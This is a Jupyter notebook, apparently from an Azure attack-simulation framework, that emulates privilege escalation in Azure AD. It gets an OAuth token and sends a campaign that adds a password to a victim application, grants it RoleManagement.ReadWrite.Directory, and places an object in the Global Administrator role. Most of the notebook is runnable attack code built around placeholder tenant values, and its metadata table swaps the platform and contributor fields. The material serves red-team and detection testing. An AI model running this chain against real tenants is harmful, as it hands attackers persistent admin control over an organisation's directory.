---
jupyter:
  jupytext:
    text_representation:
      extension: .md
      format_name: markdown
      format_version: '1.3'
      jupytext_version: 1.14.1
  kernelspec:
    language: python
---

# Admin promotion via Directory Role Permission Grant


## Metadata



|                   |    |
|:------------------|:---|
| contributors      | ['Azure'] |
| platform          | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2021-11-01 |
| modification date | 2022-05-01 |
| Tactics           | [TA0003](https://attack.mitre.org/tactics/TA0003) |
| Techniques        | [T1098.001](https://attack.mitre.org/techniques/T1098/001) |


## Description
A campaign to simulate a threat actor granting the Microsoft Graph RoleManagement.ReadWrite.Directory (application) permission to an Azure service principal and using the new permissions to add an Azure AD object or user account to an Admin directory role (i.e. Global Administrators).


## Get OAuth Access Token

```python
from msal import PublicClientApplication
import requests
import time

function_app_url = "https://FUNCTION_APP_NAME.azurewebsites.net"

tenant_id = "TENANT_ID"
public_client_app_id = "KATANA_CLIENT_APP_ID"
server_app_id_uri = "api://" + tenant_id + "/cloudkatana"
scope = server_app_id_uri + "/user_impersonation"

app = PublicClientApplication(
    public_client_app_id,
    authority="https://login.microsoftonline.com/" + tenant_id
)
result = app.acquire_token_interactive(scopes=[scope])
bearer_token = result['access_token']
```

## Set Azure Function Orchestrator

```python
endpoint = function_app_url + "/api/orchestrators/Orchestrator"
```

## Load Campaign

```python
data = {"id": "7dde2208-d4eb-480e-afa1-bad0ab7e861b", "name": "Admin promotion via Directory Role Permission Grant", "metadata": {"creationDate": "2021-11-01", "modificationDate": "2022-05-01", "platform": ["Azure"], "description": "A campaign to simulate a threat actor granting the Microsoft Graph RoleManagement.ReadWrite.Directory (application) permission to an Azure service principal and using the new permissions to add an Azure AD object or user account to an Admin directory role (i.e. Global Administrators).", "contributors": ["Roberto Rodriguez @Cyb3rWard0g"], "mitreAttack": [{"technique": "T1098.001", "tactics": ["TA0003"]}]}, "authorization": [{"resource": "https://graph.microsoft.com/", "permissionsType": "application", "permissions": ["Application.ReadWrite.All", "AppRoleAssignment.ReadWrite.All"]}], "parameters": {"appSPObjectId": {"type": "string", "metadata": {"description": "Id of the victim's Azure AD Application Service Principal object"}}, "appClientId": {"type": "string", "metadata": {"description": "Client Id of the victim's Azure AD Application"}}, "appObjectId": {"type": "string", "metadata": {"description": "Object Id of the victim's Azure AD Application"}}, "directoryObjectId": {"type": "string", "metadata": {"description": "Id of the directory object. A directory object represents an Azure Active Directory object. (application, group, user, service principal, etc."}}, "templateRoleId": {"type": "string", "metadata": {"description": "ID of the Azure AD Directory Role Id. Example: Cloud AppAdmin Template Role Id: 158c047a-c907-4556-b7ef-446551a6b5f7 or Global Admin Template Role Id: 62e90394-69f5-4237-9190-012177145e10"}}}, "variables": {"victimAppSPObjectId": "parameters(appSPObjectId)", "victimAppClientId": "parameters(appClientId)", "victimAppObjectId": "parameters(appObjectId)", "directoryObjectId": "parameters(directoryObjectId)", "templateRoleId": "parameters(templateRoleId)"}, "steps": [{"number": 1, "name": "AddPasswordToAADApp", "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "function": "Add-CKAzADAppPassword"}, "parameters": {"appObjectId": {"type": "string", "defaultValue": "variables(victimAppObjectId)"}}}, "wait": 120}, {"number": 2, "name": "GetAccessTokenOne", "dependsOn": [1], "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "function": "Get-CKAccessToken"}, "parameters": {"ClientId": {"type": "string", "defaultValue": "variables(victimAppClientId)"}, "GrantType": {"type": "string", "defaultValue": "client_credentials"}, "AppSecret": {"type": "string", "defaultValue": "reference(1).secretText"}}}}, {"number": 3, "name": "GrantRoleMgmtPermission", "dependsOn": [2], "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "function": "Grant-CKAzADAppPermissions"}, "parameters": {"accessToken": {"type": "string", "defaultValue": "reference(2).access_token"}, "spObjectId": {"type": "string", "defaultValue": "variables(victimAppSPObjectId)"}, "resourceName": {"type": "string", "defaultValue": "Microsoft Graph"}, "permissionType": {"type": "string", "defaultValue": "Application"}, "permissions": {"type": "array", "defaultValue": ["RoleManagement.ReadWrite.Directory"]}}}, "wait": 120}, {"number": 4, "name": "GetAccessTokenTwo", "dependsOn": [3], "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "function": "Get-CKAccessToken"}, "parameters": {"ClientId": {"type": "string", "defaultValue": "variables(victimAppClientId)"}, "GrantType": {"type": "string", "defaultValue": "client_credentials"}, "AppSecret": {"type": "string", "defaultValue": "reference(1).secretText"}}}}, {"number": 5, "name": "AddServicePrincipalToGARole", "dependsOn": [4], "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "function": "Add-CKAzADDirectoryRoleMember"}, "parameters": {"accessToken": {"type": "string", "defaultValue": "reference(4).access_token"}, "directoryRoleTemplateId": {"type": "string", "defaultValue": "variables(templateRoleId)"}, "directoryObjectId": {"type": "string", "defaultValue": "variables(directoryObjectId)"}}}}], "file_name": "admin_promotion_via_directory_role_permission_grant"}
```

### Send HTTP Request

```python
http_headers = {'Authorization': 'Bearer ' + bearer_token, 'Accept': 'application/json','Content-Type': 'application/json'}
results = requests.get(endpoint, json=data, headers=http_headers, stream=False).json()

time.sleep(30)
```

### Explore Output

```python
query_status = requests.get(results['statusQueryGetUri'], headers=http_headers, stream=False).json()
query_results = query_status['output']
query_results
```
